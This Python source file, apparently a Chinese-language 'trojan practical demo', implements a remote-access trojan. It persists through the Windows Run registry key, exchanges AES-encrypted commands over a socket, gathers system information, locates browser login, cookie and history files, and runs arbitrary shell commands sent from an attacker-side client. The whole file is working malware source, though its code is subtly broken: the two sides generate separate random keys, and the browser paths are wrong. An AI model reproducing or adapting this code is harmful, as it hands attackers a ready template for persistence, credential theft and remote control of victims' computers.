import os
import sys
import socket
import threading
import json
import time
import base64
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding
import winreg
import subprocess
import getpass

class TrojanDemo:
    def __init__(self):
        self.server_ip = '127.0.0.1'
        self.server_port = 8888
        self.key = os.urandom(32)  # 256-bit key
        self.iv = os.urandom(16)   # 128-bit IV
        self.running = False
    
    def encrypt(self, plaintext):
        """加密数据"""
        padder = padding.PKCS7(128).padder()
        padded_data = padder.update(plaintext.encode('utf-8')) + padder.finalize()
        
        cipher = Cipher(algorithms.AES(self.key), modes.CBC(self.iv), backend=default_backend())
        encryptor = cipher.encryptor()
        ciphertext = encryptor.update(padded_data) + encryptor.finalize()
        
        return base64.b64encode(self.iv + ciphertext).decode('utf-8')
    
    def decrypt(self, encrypted_data):
        """解密数据"""
        try:
            decoded_data = base64.b64decode(encrypted_data.encode('utf-8'))
            iv = decoded_data[:16]
            ciphertext = decoded_data[16:]
            
            cipher = Cipher(algorithms.AES(self.key), modes.CBC(iv), backend=default_backend())
            decryptor = cipher.decryptor()
            padded_plaintext = decryptor.update(ciphertext) + decryptor.finalize()
            
            unpadder = padding.PKCS7(128).unpadder()
            plaintext = unpadder.update(padded_plaintext) + unpadder.finalize()
            
            return plaintext.decode('utf-8')
        except Exception as e:
            print(f"解密失败: {str(e)}")
            return None
    
    def add_to_startup(self):
        """添加到启动项"""
        print("\n--- 添加到启动项 ---")
        
        try:
            # 获取当前脚本路径
            script_path = os.path.abspath(sys.argv[0])
            
            # 添加到当前用户的启动项
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0,
                winreg.KEY_SET_VALUE
            )
            winreg.SetValueEx(key, "TrojanDemo", 0, winreg.REG_SZ, script_path)
            winreg.CloseKey(key)
            print("成功添加到启动项")
            return True
        except Exception as e:
            print(f"添加到启动项失败: {str(e)}")
            return False
    
    def get_system_info(self):
        """获取系统信息"""
        try:
            import platform
            system_info = {
                "system": platform.system(),
                "release": platform.release(),
                "version": platform.version(),
                "machine": platform.machine(),
                "processor": platform.processor(),
                "username": getpass.getuser(),
                "hostname": platform.node()
            }
            return system_info
        except Exception as e:
            print(f"获取系统信息失败: {str(e)}")
            return None
    
    def steal_browser_data(self):
        """窃取浏览器数据"""
        try:
            # 浏览器数据路径
            browser_paths = {
                "Chrome": os.path.join(os.environ['APPDATA'], r"Google\Chrome\User Data\Default"),
                "Edge": os.path.join(os.environ['APPDATA'], r"Microsoft\Edge\User Data\Default"),
                "Firefox": os.path.join(os.environ['APPDATA'], r"Mozilla\Firefox\Profiles")
            }
            
            browser_data = {}
            
            for browser, path in browser_paths.items():
                if os.path.exists(path):
                    browser_data[browser] = {
                        "path": path,
                        "files": []
                    }
                    
                    # 查找关键文件
                    key_files = ["Login Data", "Cookies", "History", "Bookmarks"]
                    for file in key_files:
                        file_path = os.path.join(path, file)
                        if os.path.exists(file_path):
                            browser_data[browser]["files"].append({
                                "name": file,
                                "size": os.path.getsize(file_path),
                                "path": file_path
                            })
            
            return browser_data
        except Exception as e:
            print(f"窃取浏览器数据失败: {str(e)}")
            return None
    
    def execute_command(self, command):
        """执行命令"""
        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            return {
                "stdout": result.stdout,
                "stderr": result.stderr,
                "returncode": result.returncode
            }
        except Exception as e:
            print(f"执行命令失败: {str(e)}")
            return None
    
    def client_handler(self, client_socket):
        """处理客户端连接"""
        try:
            while self.running:
                # 接收命令
                data = client_socket.recv(4096).decode('utf-8')
                if not data:
                    break
                
                # 解密命令
                command = self.decrypt(data)
                if not command:
                    continue
                
                print(f"收到命令: {command}")
                
                # 处理命令
                response = {}
                
                if command == 'get_system_info':
                    response = self.get_system_info()
                elif command == 'get_browser_data':
                    response = self.steal_browser_data()
                elif command.startswith('execute '):
                    cmd = command[8:]
                    response = self.execute_command(cmd)
                elif command == 'exit':
                    break
                else:
                    response = {"error": "Unknown command"}
                
                # 加密响应
                encrypted_response = self.encrypt(json.dumps(response))
                client_socket.send(encrypted_response.encode('utf-8'))
        except Exception as e:
            print(f"处理客户端连接失败: {str(e)}")
        finally:
            client_socket.close()
    
    def start_server(self):
        """启动服务器"""
        print("=== 木马服务器启动 ===")
        
        # 添加到启动项
        self.add_to_startup()
        
        # 创建socket
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind((self.server_ip, self.server_port))
        server.listen(5)
        print(f"服务器启动成功，监听端口: {self.server_port}")
        print(f"加密密钥: {base64.b64encode(self.key).decode('utf-8')}")
        
        self.running = True
        
        try:
            while self.running:
                client_socket, client_address = server.accept()
                print(f"客户端 {client_address} 已连接")
                
                # 处理客户端连接
                client_thread = threading.Thread(target=self.client_handler, args=(client_socket,))
                client_thread.daemon = True
                client_thread.start()
        except KeyboardInterrupt:
            print("收到中断信号，正在停止...")
        finally:
            self.running = False
            server.close()
            print("服务器已停止")
    
    def start_client(self):
        """启动客户端"""
        print("=== 木马客户端启动 ===")
        
        # 创建socket
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        try:
            # 连接到服务器
            client.connect((self.server_ip, self.server_port))
            print(f"成功连接到服务器 {self.server_ip}:{self.server_port}")
            print(f"加密密钥: {base64.b64encode(self.key).decode('utf-8')}")
            
            while True:
                # 输入命令
                command = input("输入命令 (get_system_info, get_browser_data, execute <cmd>, exit): ")
                
                # 加密命令
                encrypted_command = self.encrypt(command)
                client.send(encrypted_command.encode('utf-8'))
                
                if command == 'exit':
                    break
                
                # 接收响应
                response = client.recv(4096).decode('utf-8')
                decrypted_response = self.decrypt(response)
                
                if decrypted_response:
                    print("响应:")
                    print(json.dumps(json.loads(decrypted_response), indent=2, ensure_ascii=False))
        except Exception as e:
            print(f"客户端错误: {str(e)}")
        finally:
            client.close()
            print("客户端已关闭")
    
    def demonstrate_trojan(self):
        """演示木马功能"""
        print("=== 木马实战案例演示 ===")
        print("========================")
        
        print("\n1. 木马功能列表:")
        print("   1. 持久化 (添加到启动项)")
        print("   2. 加密通信")
        print("   3. 系统信息窃取")
        print("   4. 浏览器数据窃取")
        print("   5. 远程命令执行")
        
        print("\n2. 运行模式:")
        print("   1. 服务器模式 - 运行在目标系统上")
        print("   2. 客户端模式 - 运行在攻击者系统上")
        
        choice = input("\n请选择运行模式 (1/2): ")
        
        if choice == '1':
            print("\n启动服务器模式...")
            self.start_server()
        elif choice == '2':
            print("\n启动客户端模式...")
            self.start_client()
        else:
            print("无效的选择")

if __name__ == "__main__":
    trojan = TrojanDemo()
    trojan.demonstrate_trojan()